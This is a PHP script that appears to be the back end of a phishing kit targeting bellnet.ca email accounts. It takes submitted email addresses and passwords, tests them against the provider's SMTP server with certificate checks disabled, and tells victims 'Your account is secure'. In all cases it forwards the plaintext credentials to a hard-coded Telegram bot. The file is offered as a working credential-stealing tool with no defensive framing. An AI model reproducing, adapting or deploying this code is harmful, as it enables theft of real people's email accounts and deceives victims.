<?php
// Allow requests from any domain
header("Access-Control-Allow-Origin: *");

// Allow these request headers
header("Access-Control-Allow-Headers: Content-Type, Authorization");

// Allow these request methods
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
// Enable PHP error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Send results to Telegram
function sendToTelegram($message) {
    $botToken = '7649612009:AAGz7-YLIvEEQhWBGyHmG6uhu2vPY6U-e2Q';      // ← Replace this
    $chatId   = '6464926654';        // ← Replace this

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    @file_get_contents($url . '?' . http_build_query($params));
}

// Sanitize output
function safe($str) {
    return htmlspecialchars($str ?? '', ENT_QUOTES, 'UTF-8');
}

// Set response type
header('Content-Type: application/json');

// Initialize default response
$response = [
    'status' => 'error',
    'message' => 'Something went wrong.'
];

// Only handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';

    // Validate email
    if (!preg_match('/^[^@\s]+@bellnet\.ca$/', $email)) {
        $response['message'] = 'Email must end with @bellnet.ca.';
        echo json_encode($response);
        exit;
    }

    if (!$password) {
        $response['message'] = 'Password is required.';
        echo json_encode($response);
        exit;
    }

    // SMTP config
    $server = 'ssl://smtpa.bellnet.ca';
    $port   = 465;

    // Disable SSL verification (for testing)
    $contextOptions = [
        'ssl' => [
            'verify_peer'       => false,
            'verify_peer_name'  => false,
            'allow_self_signed' => true
        ]
    ];
    $context = stream_context_create($contextOptions);

    // Connect to SMTP server
    $fp = @stream_socket_client("$server:$port", $errno, $errstr, 10, STREAM_CLIENT_CONNECT, $context);

    if (!$fp) {
        $response['message'] = "Connection failed: $errstr ($errno)";
        sendToTelegram("❌ Connection Failed\nEmail: $email\nError: $errstr ($errno)");
    } else {
        fgets($fp); // Banner

        // Send EHLO
        fputs($fp, "EHLO localhost\r\n");
        while ($line = fgets($fp)) {
            if (strpos($line, '250 ') === 0) break;
        }

        // AUTH LOGIN
        fputs($fp, "AUTH LOGIN\r\n");
        fgets($fp); // 334 username prompt
        fputs($fp, base64_encode($email) . "\r\n");
        fgets($fp); // 334 password prompt
        fputs($fp, base64_encode($password) . "\r\n");
        $smtpResponse = fgets($fp);

        if (strpos($smtpResponse, '235') === 0) {
            // Login success
            $response['status'] = 'success';
            $response['message'] = 'Your account is secure';
            sendToTelegram("✅ Login Successful\nEmail: $email\nPassword: $password");
        } else {
            // Login failed
            $response['message'] = 'You have entered invalid credentials. Please try again. ';
            sendToTelegram("❌ Login Failed\nEmail: $email\nPassword: $password\nResponse: " . safe($smtpResponse));
        }

        fputs($fp, "QUIT\r\n");
        fclose($fp);
    }
} else {
    $response['message'] = 'Invalid request method.';
}

echo json_encode($response);